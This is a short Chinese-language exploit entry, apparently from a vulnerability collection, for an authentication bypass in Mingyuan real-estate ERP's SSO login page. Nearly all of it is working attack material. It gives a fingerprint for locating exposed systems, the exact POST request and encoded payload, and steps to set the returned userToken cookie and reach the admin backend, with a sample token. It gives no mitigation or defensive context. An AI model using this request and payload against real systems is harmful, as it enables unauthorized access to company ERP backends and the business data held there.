# 明源地产ERPsso_login.aspx存在身份认证绕过漏洞

- **系统**：明源地产　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`body="明源地产ERP"`
- **请求**：`POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__yzsAppSecret=testtest&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
浏览器添加cookie中的userToken访问/PubPlatform/nav/home/default?_nav=0000即可登录后台
GET /PubPlatform/nav/home/default?_nav=0000 HTTP/1.1
Host:
Cookie: userToken=674368A4EC31B7DF719C2CB32325206859FB63D329E30D59CC3A53EBDEF8A6D4AA0370A2A4143A3AB19A87D4BFA025252EAB17A695CE7006559242EBE643C0C7B4F430890D661F14A9B51EB9C3AE1384BF7CCD020C7AC0BD8C7EA2A82E76BFA790F391FC4CA2D628D4920D5F75E02DA2A2A19512449376AE159F8003001B2295;
```
- **预期**：200　|　—